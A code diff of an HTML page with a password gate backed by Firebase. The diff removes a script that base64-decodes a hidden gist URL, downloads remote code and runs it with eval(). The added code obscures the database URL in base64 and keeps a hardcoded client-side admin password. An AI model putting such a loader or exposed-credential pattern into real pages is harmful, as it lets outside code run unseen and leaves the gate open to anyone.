@@ -67,15 +67,7 @@
         #gate .btn { width:280px; }
         #gate-err { color:var(--accent); font-size:12px; min-height:16px; }
     </style>
-<script>
-    function _loadFirebase(cb) {
-        var url = decodeURIComponent(escape(atob("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9qb2FvcnFxcS9hMGVlOWJhMzkwODdmMGYwMDQwYzlmZmQwMDkyMTRiZi9yYXcvZTE1ZWE3NmJjMDg4MWY4MjQ5ZTMwZjFkYjQzZjk1ZTQzZDUwYmU1YS9GaXJlYmFzZS50eHQ=")));
-        fetch(url)
-            .then(function(r) { return r.text(); })
-            .then(function(code) { eval(code); cb(); })
-            .catch(function(e) { console.error("Erro ao carregar config:", e); });
-    }
-</script>
+
 </head>
 <body>
 
@@ -147,14 +139,12 @@
 </div>
 
 <script>
+const _0xdb = "aHR0cHM6Ly9hbGVhdG9yaWEtNGNkNDYtZGVmYXVsdC1ydGRiLmZpcmViYXNlaW8uY29tLw==";
 // Troque esta senha por algo seguro
 const ADMIN_PASS = "antropteam2024";
 
-let db;
-_loadFirebase(function() {
-    firebase.initializeApp({ databaseURL: FIREBASE_URL });
-    db = firebase.database();
-});
+firebase.initializeApp({ databaseURL: atob(_0xdb) });
+const db = firebase.database();
 
 function checkGate() {
     const val = document.getElementById('gate-pass').value;
